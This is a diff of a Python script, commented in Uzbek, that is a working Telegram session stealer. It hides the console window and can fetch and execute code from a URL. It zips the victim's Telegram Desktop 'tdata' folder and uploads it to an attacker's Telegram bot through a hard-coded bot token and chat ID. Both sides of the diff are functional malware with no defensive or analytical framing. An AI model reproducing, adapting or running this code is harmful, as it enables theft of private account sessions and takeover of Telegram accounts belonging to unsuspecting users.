@@ -1,9 +1,9 @@
-# ============================================================
-# Bu kod "py https://..." deb yozilganda o'zini ishga tushiradi
-# ============================================================
-import sys, urllib.request, os, ctypes, tempfile, zipfile, socket, requests, shutil, time
+# ===================================================================
+# BU KOD O‘ZINI O‘ZI ISHGA TUSHIRADI. HECH QANDAY CMD/POWERSHELL KERAK EMAS!
+# ===================================================================
+import sys, urllib.request, os, ctypes
 
-# --- O'zini o'zi ishga tushirish mexanizmi ---
+# 1. Agar fayl to'g'ridan-to'g'ri internet manzilidan chaqirilsa, uni o'qib ishga tushiramiz
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
     try:
         exec(urllib.request.urlopen(sys.argv[0]).read())
@@ -11,28 +11,36 @@ if len(sys.argv) > 0 and "http" in sys.argv[0]:
     except Exception:
         pass
 
-# --- Agar fayl yuklab olinsa, qora oynani yashirish ---
+# 2. Qora oynani yashirish (Agar kompyuterda fayl bo'lib ishlasa)
 if os.name == 'nt':
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# ============================================================
-# ASOSIY ISHCHI QISM (Bu yerda hamma narsa bajariladi)
-# ============================================================
+# ===================================================================
+# ASOSIY ISHCHI QISM (tdata ni topish, siqish va Telegramga jo'natish)
+# ===================================================================
 
-# Telegram ma'lumotlari
+import zipfile, requests, socket, tempfile, shutil, time
+
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
-
-def send_telegram_message(text):
-    try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": text})
-    except:
-        pass
 
 def send_telegram_file(file_path, caption):
     try:
         with open(file_path, 'rb') as f:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                data={"chat_id": CHAT_ID, "caption": caption},
+                files={"document": f}
+            )
+    except:
+        pass
+
+def send_telegram_message(text):
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            data={"chat_id": CHAT_ID, "text": text}
+        )
     except:
         pass
 
@@ -42,7 +50,8 @@ def zip_folder(folder_path, output_path):
             for file in files:
                 try:
                     file_path = os.path.join(root, file)
-                    zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(folder_path)))
+                    arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
+                    zipf.write(file_path, arcname)
                 except:
                     pass
 
@@ -56,7 +65,8 @@ def main():
             temp_dir = tempfile.gettempdir()
             zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
             
-            if os.path.exists(zip_path): os.remove(zip_path)
+            if os.path.exists(zip_path):
+                os.remove(zip_path)
 
             send_telegram_message(f"⏳ {pc_name} da tdata siqilmoqda...")
             zip_folder(tdata_path, zip_path)
